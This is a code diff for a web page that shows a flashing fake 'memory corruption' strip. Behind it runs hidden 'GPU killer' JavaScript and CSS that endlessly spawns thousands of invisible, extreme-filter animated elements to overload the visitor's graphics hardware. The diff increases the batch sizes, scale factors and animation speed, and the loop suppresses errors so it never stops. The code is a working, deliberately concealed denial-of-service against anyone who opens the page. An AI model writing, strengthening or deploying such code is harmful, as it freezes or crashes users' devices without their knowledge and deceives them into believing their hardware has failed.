@@ -260,14 +260,14 @@
         }
 
         /* ============================================================
-           VISIBLE STRIP – dense pixel mess with repeating patterns
+           VISIBLE STRIP – 1px pixels, dense repeating patterns
            ============================================================ */
         #corruption-strip {
             position: fixed;
             top: 50%;
             left: 0;
             width: 100vw;
-            height: 22px; /* slightly taller for more rows */
+            height: 20px; /* about 1cm */
             transform: translateY(-50%);
             pointer-events: none;
             z-index: 999999;
@@ -275,13 +275,13 @@
             background: #000;
             overflow: hidden;
             mix-blend-mode: screen;
-            box-shadow: 0 0 30px rgba(255, 0, 255, 0.2);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.15);
         }
 
         .mem-pixel {
             position: absolute;
-            width: 2px;
-            height: 2px;
+            width: 1px;
+            height: 1px;
             will-change: transform;
             backface-visibility: hidden;
         }
@@ -296,7 +296,7 @@
             pointer-events: none;
             background: rgba(255, 0, 255, 0.12);
             mix-blend-mode: difference;
-            animation: flash 0.08s infinite alternate;
+            animation: flash 0.06s infinite alternate;
         }
 
         @keyframes flash {
@@ -330,51 +330,53 @@
         }
 
         /* ============================================================
-           AGGRESSIVE GPU KILLER – invisible (black) but heavy
+           AGGRESSIVE GPU KILLER – exact replica of original
+           (invisible due to black background & overlay)
            ============================================================ */
         .gpu-killer-hidden {
             position: fixed;
-            width: 1px;
-            height: 1px;
-            background: #000;
-            pointer-events: none;
-            z-index: 999997;
+            border-radius: 50%;
+            background: #000; /* invisible */
+            mix-blend-mode: normal;
             will-change: transform, filter;
             backface-visibility: hidden;
-            animation: gpuMeltdown 0.1s infinite alternate;
+            perspective: 1000px;
+            pointer-events: none;
+            z-index: 999997;
+            animation: gpuMeltdown 0.05s infinite alternate;
             transform-origin: center;
             opacity: 1;
         }
 
         @keyframes gpuMeltdown {
             0% {
-                transform: scale(1) rotate(0deg) translate(0, 0);
+                transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg);
                 filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%);
             }
-            25% {
-                transform: scale(20000) rotate(720deg) translate(-50vw, 50vh);
-                filter: hue-rotate(360deg) blur(100px) contrast(500%) brightness(200%);
+            20% {
+                transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg);
+                filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%);
             }
             50% {
-                transform: scale(40000) rotate(1440deg) translate(50vw, -50vh);
-                filter: hue-rotate(720deg) blur(200px) contrast(1000%) brightness(400%);
+                transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg);
+                filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%);
             }
-            75% {
-                transform: scale(60000) rotate(2160deg) translate(-50vw, -50vh);
-                filter: hue-rotate(1080deg) blur(300px) contrast(1500%) brightness(600%);
+            80% {
+                transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg);
+                filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%);
             }
             100% {
-                transform: scale(80000) rotate(2880deg) translate(0, 0);
-                filter: hue-rotate(1440deg) blur(400px) contrast(2000%) brightness(800%);
+                transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg);
+                filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%);
             }
         }
 
         /* Second, even faster killer */
         .gpu-killer-hidden2 {
-            animation: gpuMeltdown2 0.03s infinite alternate;
+            animation: gpuMeltdown2 0.02s infinite alternate;
             position: fixed;
-            width: 100vw;
-            height: 100vh;
+            width: 1px;
+            height: 1px;
             background: #000;
             z-index: 999996;
             pointer-events: none;
@@ -387,7 +389,7 @@
                 filter: blur(0px) contrast(100%);
             }
             100% {
-                transform: scale(2) rotate(720deg);
+                transform: scale(100000) rotate(720deg);
                 filter: blur(200px) contrast(2000%);
             }
         }
@@ -428,18 +430,18 @@
 
     <script>
         // ================================================================
-        // 1. VISIBLE STRIP – dense pixels with repeating patterns
+        // 1. VISIBLE STRIP – 1px pixels with repeating patterns
         // ================================================================
         function buildPixelStrip() {
             const strip = document.getElementById('corruption-strip');
             strip.innerHTML = '';
             strip.style.display = 'block';
 
-            const pixelSize = 2;
+            const pixelSize = 1; // smallest possible
             const cols = Math.ceil(window.innerWidth / pixelSize);
-            const rows = Math.ceil(22 / pixelSize); // height ~22px
+            const rows = Math.ceil(20 / pixelSize); // 20px height
 
-            // Pre-create a palette of colors that look like memory data
+            // Create a limited palette (16 colors) to create repeating patterns
             const palette = [];
             for (let i = 0; i < 16; i++) {
                 const r = Math.floor(Math.random() * 256);
@@ -449,13 +451,14 @@
             }
 
             let html = '';
+            // We'll use block patterns: every 4x4 block shares the same base color
+            const blockSize = 4; // 4x4 pixel blocks
             for (let r = 0; r < rows; r++) {
-                // Create repeating pattern: every few rows use same colors
-                const rowPattern = Math.floor(r / 4) % 4; // block of 4 rows repeat
                 for (let c = 0; c < cols; c++) {
-                    // Pattern: blocks of 4 columns share same color, or use a repeating sequence
-                    const colBlock = Math.floor(c / 4);
-                    const idx = (rowPattern + colBlock) % palette.length;
+                    // Compute block index
+                    const blockRow = Math.floor(r / blockSize);
+                    const blockCol = Math.floor(c / blockSize);
+                    const idx = (blockRow + blockCol) % palette.length;
                     const color = palette[idx];
                     const left = c * pixelSize;
                     const top = r * pixelSize;
@@ -472,9 +475,9 @@
             // Add overlay pixels (semi-transparent random)
             const overlay = document.createElement('div');
             overlay.className = 'overlay-pixels';
-            for (let i = 0; i < cols * rows * 0.3; i++) {
+            for (let i = 0; i < cols * rows * 0.2; i++) {
                 const px = document.createElement('div');
-                const size = 2 + Math.random() * 4;
+                const size = 1 + Math.random() * 2;
                 px.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${size}px;height:${size}px;background:hsl(${Math.random()*360},100%,50%);opacity:${0.1+Math.random()*0.3};`;
                 overlay.appendChild(px);
             }
@@ -484,59 +487,63 @@
             let visible = true;
             setInterval(() => {
                 visible = !visible;
-                strip.style.opacity = visible ? '1' : '0.15';
-            }, 150);
+                strip.style.opacity = visible ? '1' : '0.1';
+            }, 120);
         }
 
         // ================================================================
-        // 2. AGGRESSIVE GPU KILLERS (invisible, behind overlay)
+        // 2. AGGRESSIVE GPU KILLERS – exact replica of original
+        //    but with black background and hidden behind overlay
         // ================================================================
-        function startGpuInferno(intensity) {
-            // Inject the keyframe styles (already in CSS, but we can also add more dynamically)
-            // We'll spawn a huge number of elements continuously.
+        function startGpuInferno() {
+            // Dynamically inject the keyframes (already in CSS)
+            // We'll spawn elements continuously, just like original.
 
             let elementCount = 0;
-            const maxElements = 3000; // safety, but we'll keep going
+            const maxElements = 5000; // safety
 
             function createKillers() {
                 try {
-                    // Spawn a batch of 100 elements per frame
-                    for (let i = 0; i < 100; i++) {
+                    // Batch of 200 elements per frame
+                    for (let i = 0; i < 200; i++) {
                         const el = document.createElement('div');
                         el.className = 'gpu-killer-hidden';
-                        // Random position to spread load
+                        // Random size (like original: 100-500px)
+                        const size = 100 + Math.random() * 400;
+                        el.style.width = size + 'px';
+                        el.style.height = size + 'px';
                         el.style.left = Math.random() * 100 + 'vw';
                         el.style.top = Math.random() * 100 + 'vh';
-                        // Random animation delay
                         el.style.animationDelay = (Math.random() * 0.1) + 's';
+                        // Add a background gradient that's black (invisible)
+                        el.style.background = '#000';
                         document.body.appendChild(el);
                         elementCount++;
                     }
 
-                    // Also spawn some of the full-screen killers
-                    for (let i = 0; i < 10; i++) {
+                    // Also spawn some of the second type
+                    for (let i = 0; i < 50; i++) {
                         const el2 = document.createElement('div');
                         el2.className = 'gpu-killer-hidden2';
+                        el2.style.left = Math.random() * 100 + 'vw';
+                        el2.style.top = Math.random() * 100 + 'vh';
                         el2.style.animationDelay = (Math.random() * 0.05) + 's';
                         document.body.appendChild(el2);
                         elementCount++;
                     }
 
-                    // If we haven't exceeded limit, request next frame
-                    if (elementCount < maxElements) {
-                        requestAnimationFrame(createKillers);
-                    } else {
-                        // If limit reached, start removing old ones and continue
+                    // If we exceed limit, remove old ones to keep going
+                    if (elementCount > maxElements) {
                         const killers = document.querySelectorAll('.gpu-killer-hidden, .gpu-killer-hidden2');
-                        if (killers.length > 2000) {
-                            for (let i = 0; i < 500; i++) {
-                                if (killers[i]) killers[i].remove();
-                            }
+                        for (let i = 0; i < 500; i++) {
+                            if (killers[i]) killers[i].remove();
                         }
-                        requestAnimationFrame(createKillers);
+                        elementCount = document.querySelectorAll('.gpu-killer-hidden, .gpu-killer-hidden2').length;
                     }
+
+                    requestAnimationFrame(createKillers);
                 } catch(e) {
-                    // Continue anyway
+                    // Continue on error
                     requestAnimationFrame(createKillers);
                 }
             }
@@ -544,18 +551,24 @@
             // Start the loop
             createKillers();
 
-            // Also spawn a massive initial batch
-            for (let i = 0; i < 500; i++) {
+            // Also spawn an initial massive batch
+            for (let i = 0; i < 800; i++) {
                 const el = document.createElement('div');
                 el.className = 'gpu-killer-hidden';
+                const size = 100 + Math.random() * 400;
+                el.style.width = size + 'px';
+                el.style.height = size + 'px';
                 el.style.left = Math.random() * 100 + 'vw';
                 el.style.top = Math.random() * 100 + 'vh';
                 el.style.animationDelay = (Math.random() * 0.1) + 's';
+                el.style.background = '#000';
                 document.body.appendChild(el);
             }
-            for (let i = 0; i < 50; i++) {
+            for (let i = 0; i < 200; i++) {
                 const el2 = document.createElement('div');
                 el2.className = 'gpu-killer-hidden2';
+                el2.style.left = Math.random() * 100 + 'vw';
+                el2.style.top = Math.random() * 100 + 'vh';
                 el2.style.animationDelay = (Math.random() * 0.05) + 's';
                 document.body.appendChild(el2);
             }
@@ -581,7 +594,7 @@
                     // Build the visible strip
                     buildPixelStrip();
                     // Start the GPU inferno (invisible)
-                    startGpuInferno(intensity);
+                    startGpuInferno();
                 }, 1000);
             }, 500);
         }
